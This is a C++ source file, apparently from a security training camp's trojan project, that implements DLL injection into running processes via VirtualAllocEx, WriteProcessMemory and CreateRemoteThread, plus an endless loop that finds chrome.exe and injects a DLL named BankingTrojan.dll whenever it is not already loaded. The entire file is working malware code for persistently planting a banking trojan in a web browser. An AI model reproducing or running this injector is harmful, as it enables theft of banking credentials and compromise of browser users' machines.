#include"InjectDll.h"

void inject(DWORD pid, char* dllname){
    // char dllname[150] = "C:\\Users\\rota1001\\Desktop\\T5Camp_2025_Trojan\\bin\\BankingTrojan.dll";
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    int size = strlen(dllname) + 5;

    PVOID procdlladdr = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (procdlladdr == NULL) {
        printf("handle %p VirtualAllocEx failed\n", hprocess);
        return;
    }

    SIZE_T writenum;
    if (!WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
        printf("handle %p WriteProcessMemory failed\n", hprocess);
        return;
    }
    
    FARPROC loadfuncaddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (!loadfuncaddr) {
        printf("handle %p GetProcAddress failed\n", hprocess);
        return;
    }
    
    HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
    if (!hthread) {
        printf("handle %p CreateRemoteThread failed\n", hprocess);
        return;
    }
  //  MessageBoxA(0, "success", "info", 0);
    CloseHandle(hthread);
    CloseHandle(hprocess);

    return;
}

bool isRundll32(){
    char processName[MAX_PATH] = {0};
    if(GetModuleFileNameA(NULL, processName, MAX_PATH)){
        std::string processNameStr = processName;
        if(processNameStr.find("rundll32.exe") != std::string::npos){
            return 1;
        }
    }
    return 0;
}

bool IsDllLoadedInProcess(DWORD pid, const std::string& dllName)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL)
    {
        // std::cout << "Failed to open process." << std::endl;
        return false;
    }

    DWORD cbNeeded;
    HMODULE hMods[1024];
    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        // std::cout << "Failed to enumerate modules." << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    int numModules = cbNeeded / sizeof(HMODULE);
    for (int i = 0; i < numModules; i++)
    {
        TCHAR szModName[MAX_PATH];
        if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
        {
            std::string modName = szModName;
            if (modName.find(dllName) != std::wstring::npos)
            {
                CloseHandle(hProcess);
                return true;
            }
        }
    }

    CloseHandle(hProcess);
    return false;
}

void injectionLoop(char* dllPath){
    while(1){
        bool hasdll = 0;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            continue;
        }
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                std::string currentProcessName = pe.szExeFile;
                if (currentProcessName == "chrome.exe" && IsDllLoadedInProcess(pe.th32ProcessID, "BankingTrojan.dll")) {
                    hasdll = 1;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        if(!hasdll && Process32First(hSnapshot, &pe)){
            do {
                std::string currentProcessName = pe.szExeFile;
                if (currentProcessName == "chrome.exe") {
                    inject(pe.th32ProcessID, dllPath);
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
}